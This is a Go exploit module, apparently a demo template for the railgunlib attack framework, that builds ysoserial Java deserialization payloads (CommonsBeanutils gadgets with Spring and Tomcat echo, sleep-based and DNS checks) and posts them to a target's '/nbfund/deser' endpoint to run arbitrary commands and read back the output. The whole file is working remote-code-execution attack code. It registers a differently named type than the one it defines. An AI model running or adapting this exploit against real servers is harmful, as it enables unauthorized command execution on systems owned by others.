package exp_product1

import (
	"encoding/base64"
	"github.com/lz520520/railgunlib/pkg/gadgets"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"time"
)

type Exp_YsoDemo struct {
	exp_templates.ExpTemplate
}

func (self *Exp_YsoDemo) Cmd1(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	payload := gadgets.YsoserialPayloadGenerator(self.Params.YsoGadget, cmd)
	params := "params=" + url.QueryEscape(base64.StdEncoding.EncodeToString(payload))
	httpresp := self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/nbfund/deser"), params, self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	self.EchoInfoMsg("无回显，自行检查")
	return
}

func (self *Exp_YsoDemo) Cmd2(cmd string) (expResult exp_model.ExpResult) {
	headers := self.GetInitExpHeaders()
	// 获取yso payload
	payload := gadgets.YsoserialPayloadGenerator(self.Params.YsoGadget, cmd)
	params := "params=" + url.QueryEscape(base64.StdEncoding.EncodeToString(payload))
	// cmd插入头部
	self.AddEncodeCmdHeader(headers, cmd)

	httpresp := self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/nbfund/deser"), params, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	self.EchoDebugMsg(httpresp.Resp.Header.Get("Transfer-encoded"))

	if self.CheckRespHeader(httpresp.Resp.Header) {
		self.EchoInfoMsg("利用成功")
		// 解码响应数据
		result, err := self.ParserEncodeCmdResult(httpresp.Body)
		if err != nil {
			expResult.Err = err
			return
		}
		self.EchoInfoMsg(result)
	} else {
		self.EchoErrMsg("利用失败")
	}

	return
}

func (self *Exp_YsoDemo) subSleep() (err error) {
	headers := self.GetInitExpHeaders()
	// 获取yso payload
	payload := gadgets.YsoserialPayloadGenerator(self.Params.YsoGadget, "")
	params := "params=" + url.QueryEscape(base64.StdEncoding.EncodeToString(payload))

	httpresp := self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/nbfund/deser"), params, headers)
	if httpresp.Err != nil {
		err = httpresp.Err
		return
	}
	return
}

func (self *Exp_YsoDemo) Cmd3(cmd string) (expResult exp_model.ExpResult) {
	self.CheckGagdetWithSleep(self.subSleep, 10*time.Second)

	return
}

func init() {
	//fmt.Printf("%v, %v", reflect.ValueOf(test).Type(), reflect.ValueOf(test).Kind())

	expSubOption := exp_model.ExpSubOption{
		CmdContent: "",
		Gadgets:    []string{"FindClassByDNS"},
	}

	expSubOption2 := exp_model.ExpSubOption{
		CmdContent: "",
		Gadgets: []string{
			"CommonsBeanutilsNoCC1SpringEncodeEcho",
			"CommonsBeanutilsNoCC2SpringEncodeEcho",
			"CommonsBeanutilsNoCC1TomcatEncodeEcho",
			"CommonsBeanutilsNoCC2TomcatEncodeEcho"},
	}

	expSubOption3 := exp_model.ExpSubOption{
		CmdContent: "",
		Gadgets: []string{
			"CommonsBeanutilsNoCC1Sleep",
			"CommonsBeanutilsNoCC2Sleep",
			"CommonsBeanutilsNoCC1Sleep",
			"CommonsBeanutilsNoCC2Sleep"},
	}

	registerMsg := exp_register.ExpRegisterMsg{
		Msg: exp_model.ExpMsg{
			Author: `lz520520`,
			Time:   `2022-6-27`,
			Range:  ``,
			ID:     `RCE`,
			Describe: `
`,
			Payload: ``,
		},
		SubOptions: map[string]exp_model.ExpSubOption{
			"1": expSubOption,
			"2": expSubOption2,
			"3": expSubOption3,
		},
		AliasMap: map[string]string{
			"1": "Check",
			"2": "Echo",
			"3": "Sleep",
		},
	}

	exp_register.ExpStructRegister(&Exp_VUL1{}, registerMsg)

}
